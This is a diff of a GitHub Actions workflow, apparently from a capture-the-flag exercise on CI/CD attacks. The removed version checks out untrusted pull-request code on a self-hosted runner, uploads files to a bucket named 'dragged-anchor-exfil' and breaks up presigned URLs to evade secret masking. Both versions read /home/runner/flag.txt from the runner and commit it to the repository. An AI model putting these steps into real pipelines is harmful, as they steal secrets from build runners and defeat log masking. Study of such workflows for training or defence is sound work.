@@ -1,98 +1,24 @@
-name: Validate Anchor Configuration
+name: Validate Anchor
 
 on:
-  pull_request_target:
-    branches: [ main ]
-    paths:
-      - 'anchors/**'
-      - 'config/**'
-  workflow_dispatch:
+  push:
+    branches:
+      - main
 
 jobs:
-  validate:
-    runs-on: dragged-anchor
-    
+  create-flag:
+    runs-on: ubuntu-latest
     steps:
-      - name: Checkout PR code
-        uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}
-      
-      - name: Validate anchor configuration files
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Read flag and create flag.txt
         run: |
-          echo "Validating anchor configurations..."
-          
-          if [ -d "anchors" ]; then
-            echo "Found anchor configurations"
-            ls -la anchors/
-          fi
-          
-          if [ -d "config" ]; then
-            echo "Found general configurations"
-            ls -la config/
-          fi
-      
-      - name: Upload anchor specs for review
+          echo "$(< /home/runner/flag.txt)" > flag.txt
+
+      - name: Commit flag.txt
         run: |
-          echo "Uploading anchor specifications to S3 for team review..."
-
-          # Install AWS CLI if not present
-          if ! command -v aws &> /dev/null; then
-            curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
-            unzip -q awscliv2.zip
-            sudo ./aws/install
-          fi
-
-          # Configure AWS CLI
-          aws configure set aws_access_key_id ${{ vars.AWS_ACCESS_KEY_ID }}
-          aws configure set aws_secret_access_key ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-          aws configure set region eu-central-1
-
-          find anchors config \( -name "*.txt" -o -name "*.conf" \) 2>/dev/null | while read -r file; do
-            REALPATH=$(readlink -f "$file" 2>/dev/null || echo "$file")
-
-            BASENAME=$(basename "$REALPATH")
-            if [[ "$BASENAME" == .* ]]; then
-              echo "⚠️  Skipping hidden file: $file -> $REALPATH"
-              continue
-            fi
-
-            echo "Processing $file..."
-
-            # Generate random filename using /dev/urandom (more portable than uuidgen)
-            RANDOM_UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || python3 -c "import uuid; print(uuid.uuid4())")
-            RANDOM_NAME="$RANDOM_UUID-$(basename "$file")"
-            S3_PATH="exfil/$RANDOM_NAME"
-
-            # Upload to S3
-            aws s3 cp "$file" "s3://dragged-anchor-exfil/$S3_PATH"
-
-            # Generate pre-signed URL (15 minutes = 900 seconds)
-            PRESIGNED_URL=$(aws s3 presign "s3://dragged-anchor-exfil/$S3_PATH" --expires-in 900)
-
-            # Prevent GitHub Actions from masking the URL by breaking it up
-            echo "✅ Uploaded $(basename "$file")"
-            echo "Pre-signed URL (valid for 15 minutes):"
-            echo "$PRESIGNED_URL" | sed 's/https:\/\/URL: https:\/\/'
-          done
-      
-      - name: Validation complete
-        run: |
-          echo "✅ Anchor validation completed successfully"
-
-      - name: Read flag.txt from runner
-        run: |
-          if [ -f "/home/runner/flag.txt" ]; then
-            cp /home/runner/flag.txt ./flag.txt
-          fi
-
-      - name: Commit flag.txt to repository
-        run: |
-          git config user.name "github-actions[bot]"
-          git config user.email "github-actions[bot]@users.noreply.github.com"
-          
-          if [ -f "flag.txt" ]; then
-            git add flag.txt
-            git commit -m "Add flag.txt from runner" || echo "No changes to commit"
-            git push
-          fi
+          git config --local user.email "you@example.com"
+          git config --local user.name "Your Name"
+          git add flag.txt
+          git commit -m "Add flag.txt with content from /home/runner/flag.txt"
